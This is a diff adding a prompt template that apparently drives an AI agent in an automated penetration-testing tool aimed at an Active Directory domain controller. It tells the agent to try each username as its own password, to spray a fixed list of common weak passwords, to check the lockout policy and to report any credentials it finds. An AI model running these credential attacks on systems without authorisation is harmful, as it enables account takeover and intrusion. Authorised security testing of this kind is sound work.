@@ -1,0 +1,28 @@
+Perform LOW HANGING FRUIT credential discovery (NO CREDENTIALS):
+Domain: {{ domain }}
+DC IP: {{ dc_ip_display }}
+Task ID: {{ task_id }}
+
+**CRITICAL: These techniques work WITHOUT credentials to discover passwords:**
+1. username_as_password(target=DC_IP, domain=DOMAIN) - HIGH SUCCESS RATE
+   Tests if users have username=password (e.g., testuser:testuser)
+   Zero lockout risk, one attempt per user
+
+2. password_spray - YOU MUST CALL THIS ONCE FOR EACH PASSWORD:
+   password_spray(target=DC_IP, domain=DOMAIN, password='Password1')
+   password_spray(target=DC_IP, domain=DOMAIN, password='Welcome1')
+   password_spray(target=DC_IP, domain=DOMAIN, password='Summer2024')
+   password_spray(target=DC_IP, domain=DOMAIN, password='Company123')
+   password_spray(target=DC_IP, domain=DOMAIN, password='Passw0rd!')
+   **Call spray for EACH password above - common weak passwords**
+
+3. password_policy(target=DC_IP, domain=DOMAIN) - Check lockout before spraying
+
+These are the FIRST techniques to run when you have no credentials.
+Report any credentials found immediately.
+{% if state_context %}
+
+## Current Operation State
+
+{{ state_context }}
+{% endif -%}
